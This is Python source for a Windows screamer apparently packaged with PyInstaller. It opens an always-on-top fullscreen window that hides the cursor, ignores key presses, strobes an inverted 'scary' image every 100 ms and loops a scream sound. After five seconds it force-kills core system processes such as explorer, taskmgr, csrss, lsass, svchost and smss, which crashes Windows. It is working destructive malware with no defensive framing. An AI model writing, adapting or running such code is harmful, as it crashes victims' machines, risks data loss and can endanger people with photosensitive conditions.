from PyQt5 import QtCore, QtGui, QtWidgets
from PIL import Image, ImageOps
import winsound
import sys
import os
import time
import threading

class FlashingImageApp(QtWidgets.QWidget):

    def __init__(self):
        super().__init__()
        self.image_path = image_path
        self.sound_path = sound_path
        self.inverted = False

        self.image = Image.open(self.image_path)
        self.qt_image = self.pil_to_qt(self.image)

        self.setWindowFlags(QtCore.Qt.FramelessWindowHint | QtCore.Qt.WindowStaysOnTopHint)
        self.showFullScreen()
        self.setCursor(QtCore.Qt.BlankCursor)
        self.timer = QtCore.QTimer(self)
        self.timer.timeout.connect(self.update_image)
        self.timer.start(100)
        threading.Thread(target=self.play_sound, daemon=True).start()
        threading.Thread(target=self.stop_core_applications, daemon=True).start()

    def play_sound(self):
        winsound.PlaySound(self.sound_path, winsound.SND_FILENAME | winsound.SND_LOOP | winsound.SND_ASYNC)

    def stop_core_applications(self):
        time.sleep(5)
        core_apps = ["explorer.exe", "taskmgr.exe", "cmd.exe", "csrss.exe", "lsass.exe", "services.exe", "svchost.exe", "smss.exe", "taskhost.exe" , "msiexec.exe", "audiodg.exe"]  # Add more apps as needed
        for app in core_apps:
            os.system(f"taskkill /f /im {app}")

    def update_image(self):
        self.inverted = not self.inverted
        if self.inverted:
            inverted_image = ImageOps.invert(self.image.convert('RGB'))
            self.qt_image = self.pil_to_qt(inverted_image)
        else:
            self.qt_image = self.pil_to_qt(self.image)
        self.update()

    def pil_to_qt(self, pil_image):
        data = pil_image.convert("RGBA").tobytes("raw", "RGBA")
        q_image = QtGui.QImage(data, pil_image.width, pil_image.height, QtGui.QImage.Format_RGBA8888)
        return QtGui.QPixmap.fromImage(q_image)

    def paintEvent(self, event):
        painter = QtGui.QPainter(self)
        painter.drawPixmap(self.rect(), self.qt_image)

    def keyPressEvent(self, event):
        pass

def main(image_path, sound_path):
    app = QtWidgets.QApplication(sys.argv)
    FlashingImageApp()
    sys.exit(app.exec_())

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

if __name__ == '__main__':
    image_path = resource_path('data/scary_image.png')
    sound_path = resource_path('data/scary_scream.wav')
    main(image_path, sound_path)
